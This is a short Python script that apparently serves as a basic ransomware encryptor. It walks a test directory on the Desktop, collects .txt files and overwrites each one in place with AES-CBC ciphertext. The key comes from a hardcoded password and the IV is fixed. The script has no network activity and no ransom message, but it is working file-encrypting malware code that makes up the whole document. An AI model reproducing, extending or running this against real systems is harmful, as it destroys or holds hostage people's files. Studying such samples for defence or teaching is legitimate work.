from Crypto.Cipher import AES
import hashlib
from queue import Queue 
import os

encrypted_ext = ('.txt',)

file_paths = []
for root, dir, files in os.walk('/root/Desktop/test'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'/'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'/'+file)

print(f"[*] encrypting {file_paths}")
q = Queue()

for file in file_paths:
	q.put(file) 


files = q.get()


password = b"fsocietyencryptingtheworld"
key = hashlib.sha256(password).digest()
#mode = AES.MODE_CBC
IV = 'ThisisanIV456aaa'.encode()

def pad_files(files):
	while len(files) % 16 != 0:
		files = files + b"0"
	return files	

cipher = AES.new(key,AES.MODE_CBC,IV)


for file in file_paths:

	with open(file, 'rb') as f:
		data = f.read()
		padded_file = pad_files(data)
	with open(file, 'wb') as en:
		encrypted_data = cipher.encrypt(padded_file)
		en.write(encrypted_data)









